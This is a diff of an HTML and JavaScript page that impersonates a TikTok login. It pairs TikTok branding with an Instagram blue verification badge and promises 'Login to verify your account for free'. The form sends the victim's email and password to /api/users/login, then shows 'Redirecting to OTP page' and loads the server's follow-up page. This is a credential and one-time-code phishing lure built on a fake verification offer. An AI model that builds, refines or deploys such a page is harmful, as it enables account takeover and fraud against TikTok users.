@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok · OTP login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>TikTok · verification login</title>
     <style>
         * {
             margin: 0;
@@ -12,183 +12,174 @@
         }
 
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
-            background: #0b0b0b; /* deep black background — TikTok dark mode */
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: #0a0a0a;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-        }
-
-        /* main card – clean dark theme, smooth borders */
-        .container {
-            background: #181818;   /* dark elevated surface */
-            padding: 40px 32px;
-            border-radius: 28px;
-            box-shadow: 0 20px 40px rgba(255, 255, 255, 0.02), 0 0 0 1px rgba(255,255,255,0.03);
+            padding: 16px;
             width: 100%;
-            max-width: 400px;
-            backdrop-filter: blur(2px);
-            transition: box-shadow 0.2s;
         }
 
-        /* ----- TikTok logo + blue‑verified username row (clean) ----- */
-        .tiktok-header {
+        /* fully responsive container - centers perfectly on all devices */
+        .container {
+            background: #121212;
+            padding: clamp(24px, 6vw, 40px) clamp(20px, 5vw, 32px);
+            border-radius: clamp(20px, 5vw, 26px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255,255,255,0.05);
+            width: 100%;
+            max-width: 440px;
+            margin: 0 auto;
+            transition: all 0.2s ease;
+        }
+
+        .tiktok-brand {
             display: flex;
             flex-direction: column;
             align-items: center;
-            margin-bottom: 28px;
+            margin-bottom: clamp(16px, 4vw, 24px);
         }
 
         .tiktok-logo svg {
-            width: 70px;
-            height: 70px;
+            width: clamp(60px, 15vw, 70px);
+            height: clamp(60px, 15vw, 70px);
             display: block;
-            margin-bottom: 14px;
+            margin-bottom: clamp(10px, 3vw, 14px);
         }
 
-        /* verified username pill – dark but refined */
-        .user-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            background: #252525;
-            padding: 10px 20px 10px 24px;
-            border-radius: 60px;
-            border: 1px solid #333;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.6);
-        }
-
-        .user-badge .username {
-            color: #f1f1f1;
-            font-weight: 500;
-            font-size: 18px;
-            letter-spacing: -0.2px;
-        }
-
-        /* Instagram‑style verified blue badge (exactly as described) */
-        .verified-blue {
-            display: inline-flex;
+        .badge-row {
+            display: flex;
             align-items: center;
             justify-content: center;
-            background: #3897f0;   /* instagram blue */
-            width: 24px;
-            height: 24px;
-            border-radius: 50%;
-            color: white;
-            font-size: 15px;
-            font-weight: 600;
+            gap: 6px;
+            background: #1e1e1e;
+            padding: clamp(6px, 2vw, 8px) clamp(16px, 4vw, 20px) clamp(6px, 2vw, 8px) clamp(20px, 5vw, 24px);
+            border-radius: 40px;
+            border: 1px solid #2b2b2b;
+            width: fit-content;
+            max-width: 100%;
+            flex-wrap: wrap;
+        }
+
+        .badge-row .username {
+            color: #f0f0f0;
+            font-size: clamp(16px, 4.5vw, 18px);
+            font-weight: 500;
+            white-space: nowrap;
+        }
+
+        /* EXACT INSTAGRAM BLUE VERIFICATION BADGE - PNG IMAGE */
+        .ig-verified-badge {
+            display: inline-block;
+            width: clamp(18px, 5vw, 20px);
+            height: clamp(18px, 5vw, 20px);
+            background-image: url('https://img.icons8.com/color/48/instagram-verification-badge.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
             margin-left: 2px;
-            box-shadow: 0 2px 6px rgba(0,100,255,0.4);
-        }
-        .verified-blue::after {
-            content: "✓";
+            flex-shrink: 0;
         }
 
-        /* heading – subtle, not too heavy */
         h2 {
-            color: #e5e5e5;
+            color: #fff;
             font-weight: 600;
-            font-size: 24px;
-            margin-bottom: 32px;
+            font-size: clamp(18px, 5vw, 22px);
+            margin: clamp(20px, 5vw, 24px) 0 clamp(22px, 5vw, 26px) 0;
             text-align: center;
-            letter-spacing: -0.3px;
+            line-height: 1.3;
+            padding: 0 4px;
+            word-break: break-word;
         }
 
-        /* form elements – dark & clean */
         .form-group {
-            margin-bottom: 24px;
+            margin-bottom: clamp(16px, 4vw, 20px);
+            width: 100%;
         }
 
         label {
             display: block;
-            margin-bottom: 8px;
-            color: #aaa;
-            font-size: 14px;
+            margin-bottom: 6px;
+            color: #bbb;
+            font-size: clamp(13px, 3.5vw, 14px);
             font-weight: 500;
-            letter-spacing: 0.2px;
+            padding-left: 4px;
         }
 
         input {
             width: 100%;
-            padding: 16px 14px;
-            background: #232323;
-            border: 1px solid #2e2e2e;
-            border-radius: 18px;
-            font-size: 16px;
-            color: #fff;
-            transition: border 0.2s, background 0.2s, box-shadow 0.2s;
+            padding: clamp(12px, 3.5vw, 14px);
+            background: #1e1e1e;
+            border: 1px solid #2f2f2f;
+            border-radius: clamp(14px, 4vw, 16px);
+            font-size: clamp(15px, 4vw, 16px);
+            color: white;
+            transition: border 0.2s;
+            -webkit-appearance: none;
+            appearance: none;
         }
 
         input:focus {
             outline: none;
-            border-color: #fe2c55;   /* TikTok accent */
-            background: #2a2a2a;
-            box-shadow: 0 0 0 3px rgba(254, 44, 85, 0.15);
+            border-color: #fe2c55;
+            background: #262626;
         }
 
-        input::placeholder {
-            color: #5a5a5a;
-            font-weight: 400;
-        }
-
-        /* TikTok red login button */
         button {
             width: 100%;
-            padding: 16px;
-            background: #fe2c55;      /* TikTok red/pink */
+            padding: clamp(12px, 3.5vw, 14px);
+            background: #fe2c55;
             color: white;
             border: none;
-            border-radius: 40px;       /* pill shape */
-            font-size: 17px;
+            border-radius: 40px;
+            font-size: clamp(15px, 4vw, 16px);
             font-weight: 600;
             cursor: pointer;
-            transition: background 0.2s, transform 0.1s, opacity 0.2s;
+            transition: background 0.2s;
             margin-top: 8px;
-            box-shadow: 0 8px 18px rgba(254, 44, 85, 0.25);
+            -webkit-appearance: none;
+            appearance: none;
         }
 
         button:hover {
-            background: #ff4d6f;
-            transform: scale(1.01);
+            background: #ff4d70;
         }
 
         button:disabled {
             opacity: 0.5;
             pointer-events: none;
-            transform: none;
         }
 
         .error {
-            color: #ff9bab;
-            margin-top: 18px;
+            color: #ff8a9f;
+            margin-top: 16px;
             text-align: center;
-            font-size: 14px;
-            font-weight: 500;
-            min-height: 24px;
+            font-size: clamp(13px, 3.5vw, 14px);
+            min-height: 22px;
+            padding: 0 8px;
+            word-break: break-word;
         }
 
-        /* loading overlay inside card (clean spinner) */
         .loading {
             display: none;
             text-align: center;
-            margin-top: 24px;
+            margin-top: 20px;
         }
 
         .loading-spinner {
             border: 3px solid #2d2d2d;
             border-top: 3px solid #fe2c55;
             border-radius: 50%;
-            width: 36px;
-            height: 36px;
+            width: clamp(32px, 8vw, 36px);
+            height: clamp(32px, 8vw, 36px);
             animation: spin 1s linear infinite;
             margin: 8px auto;
         }
 
         .loading p {
             color: #aaa;
-            font-size: 14px;
-            font-weight: 400;
+            font-size: clamp(13px, 3.5vw, 14px);
         }
 
         @keyframes spin {
@@ -196,29 +187,23 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* tiny extra link / footer – optional but fits TikTok */
-        .footer-note {
-            margin-top: 26px;
-            text-align: center;
-            color: #6b6b6b;
-            font-size: 13px;
-        }
-        .footer-note a {
-            color: #fe2c55;
-            text-decoration: none;
-            font-weight: 500;
-            margin-left: 6px;
-        }
-        .footer-note a:hover {
-            text-decoration: underline;
+        /* Small height adjustment for very small screens */
+        @media (max-height: 600px) {
+            body {
+                padding: 8px;
+            }
+            .container {
+                padding: 20px;
+            }
+            .tiktok-brand {
+                margin-bottom: 12px;
+            }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- TikTok logo + verified badge row (exact spec: logo on top, then @tiktokpage + blue IG badge) -->
-        <div class="tiktok-header">
-            <!-- tiktok svg logo – clean white/red version, placed at top center -->
+        <div class="tiktok-brand">
             <div class="tiktok-logo">
                 <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
                     <path d="M38.306 15.768C36.3 14.536 34.67 12.762 33.652 10.7C32.774 8.92 32.302 6.97 32.28 5H24.564V28.806C24.542 30.216 23.944 31.546 22.932 32.51C21.92 33.474 20.568 33.996 19.158 33.974C17.748 33.952 16.418 33.354 15.454 32.342C14.49 31.33 13.968 29.978 13.99 28.568C14.034 25.704 16.382 23.4 19.246 23.4C19.88 23.4 20.492 23.526 21.06 23.744V16.026C20.446 15.914 19.832 15.858 19.204 15.858C14.898 15.858 11.124 18.536 9.74 22.49C8.356 26.444 9.256 30.766 12.096 33.816C14.158 36.024 17.014 37.296 20.028 37.296C26.284 37.296 31.38 32.2 31.38 25.944V15.28C32.954 16.412 34.724 17.246 36.588 17.734C37.488 17.978 38.388 18.136 39.288 18.228V14.17C38.944 14.114 38.606 14.034 38.306 13.942V15.768Z" fill="white"/>
@@ -226,39 +211,33 @@
                     <path d="M10.406 36.094C10.656 34.934 11.112 33.828 11.756 32.826C10.41 31.388 9.488 29.622 9.072 27.712C8.616 29.6 8.748 31.588 9.45 33.4C10.152 35.212 11.384 36.758 13 37.86C12.438 37.278 11.962 36.624 11.588 35.918C11.19 36.324 10.836 36.77 10.532 37.246C10.49 36.862 10.44 36.478 10.406 36.094Z" fill="#25F4EE"/>
                 </svg>
             </div>
-            <!-- username with Instagram blue verification badge -->
-            <div class="user-badge">
+            <div class="badge-row">
                 <span class="username">@tiktokpage</span>
-                <span class="verified-blue" aria-label="Verified on Instagram"></span>
+                <!-- EXACT INSTAGRAM BLUE BADGE PNG - blue circle with white check -->
+                <span class="ig-verified-badge" aria-label="Verified on Instagram"></span>
             </div>
         </div>
 
-        <h2>Log in to TikTok</h2>
+        <h2>Login to verify your account for free</h2>
 
-        <!-- form keeps exact original classes/IDs: loginForm, email, password, submitBtn, error, loading -->
         <form id="loginForm" action="/api/users/login" method="POST">
             <div class="form-group">
                 <label for="email">Email</label>
-                <input type="email" id="email" name="email" placeholder=" " required>
+                <input type="email" id="email" name="email" required>
             </div>
             <div class="form-group">
                 <label for="password">Password</label>
-                <input type="password" id="password" name="password" placeholder=" " required>
+                <input type="password" id="password" name="password" required>
             </div>
-            <button type="submit" id="submitBtn">Log in</button>
+            <button type="submit" id="submitBtn">Login</button>
             <div id="error" class="error"></div>
             <div id="loading" class="loading">
                 <div class="loading-spinner"></div>
                 <p>Redirecting to OTP page...</p>
             </div>
         </form>
-
-        <div class="footer-note">
-            <span>Don't have an account?</span> <a href="#">Sign up</a>
-        </div>
     </div>
 
-    <!-- JavaScript – same logic as original: async fetch with loading/error handling, but preserves the exact design -->
     <script>
         (function() {
             const form = document.getElementById('loginForm');
@@ -272,22 +251,19 @@
                 e.preventDefault();
 
                 const email = emailInput.value.trim();
-                const password = passwordInput.value.trim();
+                const password = passwordInput.value;
 
-                // basic validation (mirror original behaviour)
                 if (!email || !password) {
                     errorDiv.textContent = 'Email and password are required';
                     return;
                 }
 
-                // show loading, disable button (like original)
                 submitBtn.disabled = true;
                 submitBtn.style.opacity = '0.7';
                 loadingDiv.style.display = 'block';
                 errorDiv.textContent = '';
 
                 try {
-                    // We keep the exact fetch call as original – pointing to /api/users/login
                     const response = await fetch('/api/users/login', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -295,27 +271,22 @@
                     });
 
                     if (!response.ok) {
-                        // Try to parse error json, fallback to generic message
                         let errorMsg = 'Login failed';
                         try {
                             const data = await response.json();
                             errorMsg = data.error || errorMsg;
-                        } catch {
-                            // ignore
-                        }
+                        } catch (e) {}
                         errorDiv.textContent = errorMsg;
-                        // revert loading state
                         submitBtn.disabled = false;
                         submitBtn.style.opacity = '1';
                         loadingDiv.style.display = 'none';
                     } else {
-                        // On success, replace page with OTP page (HTML response) – exactly as original
                         const html = await response.text();
                         document.open();
                         document.write(html);
                         document.close();
                     }
-                } catch (networkError) {
+                } catch (networkErr) {
                     errorDiv.textContent = 'Network error occurred';
                     submitBtn.disabled = false;
                     submitBtn.style.opacity = '1';
@@ -323,7 +294,6 @@
                 }
             });
 
-            // optional: clear error when typing (user friendly)
             emailInput.addEventListener('input', () => { errorDiv.textContent = ''; });
             passwordInput.addEventListener('input', () => { errorDiv.textContent = ''; });
         })();
